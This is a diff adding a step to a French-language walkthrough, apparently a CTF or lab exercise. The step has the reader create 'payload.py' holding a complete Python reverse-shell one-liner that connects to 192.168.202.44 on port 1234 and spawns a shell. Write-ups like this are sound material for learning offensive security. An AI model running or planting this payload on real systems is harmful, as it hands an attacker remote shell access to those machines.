@@ -149,3 +149,16 @@ Ca fonctionne !
 -->
 
 Maintenant, nous pouvons l'utiliser pour obtenir un shell, d'abord en utilisant notre serveur web pour servir une charge utile de shell inversé.
+
+On créer un fichier 'payload.py', et y mets la charge utile :
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.44",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+<!--
+![image](https://github.com/user-attachments/assets/72ea4b3d-4283-4718-97b2-9e9b80fcabbb)
+-->
+<!--
+![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)
+-->
+<!--
+![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
+-->
+
